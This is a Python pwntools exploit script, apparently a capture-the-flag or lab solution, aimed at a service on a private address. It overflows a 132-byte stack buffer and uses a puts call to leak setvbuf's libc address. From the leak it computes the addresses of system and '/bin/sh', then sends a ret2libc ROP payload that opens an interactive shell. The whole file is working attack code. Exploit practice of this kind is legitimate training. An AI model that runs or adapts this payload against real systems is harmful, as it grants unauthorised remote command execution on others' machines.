#import pwntools
from pwn import *

#remote connection to appserver
p = remote("10.0.2.2", 9000)

#offset to overflow buffer
offset = 132
junk = b"A" * offset

#addresses for leak payload
setvbuf_at_got = 0x80497b4
puts_at_plt = 0x8048340
back_to_main = 0x804847b

#first payload - overflow + call puts to leak "setvbuf" address + go back to main (prevent crash)
payload = [

	junk,
	p32(puts_at_plt),
	p32(back_to_main),
	p32(setvbuf_at_got),
]

#format and send payload to appserver
payload = b"".join(payload)
p.sendline(payload)

#recvline to view leak through logs properly
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

#store first 4 bytes of unpacked leak - true address of setvbuf
leak = u32(p.recv(4))
#log and show leak in hex
log.info(f"{hex(leak)=}")

#offset of setvbuf
setvbuf_offset = 0x60370

#find base address of libc with leak (true address setvbuf) - offset setvbuf
base_address_of_libc = leak - setvbuf_offset

#system offset - work out true address of system
system_offset = 0x3adb0
system_address = base_address_of_libc + system_offset

#bin_sh offset - work out true address of bin/sh string
bin_sh_offset = 0x15bb2b
bin_sh_address = base_address_of_libc + bin_sh_offset

#return rop gadget to prevent crash
ret = 0x80482fa

#final payload - overflow buffer + system /bin/sh command to give shell
second_payload = [

	junk,
	p32(system_address),
	p32(ret),
	p32(bin_sh_address)

]

#format and send final payload
second_payload = b"".join(second_payload)
p.sendline(second_payload)

#make connection interactive
p.interactive()

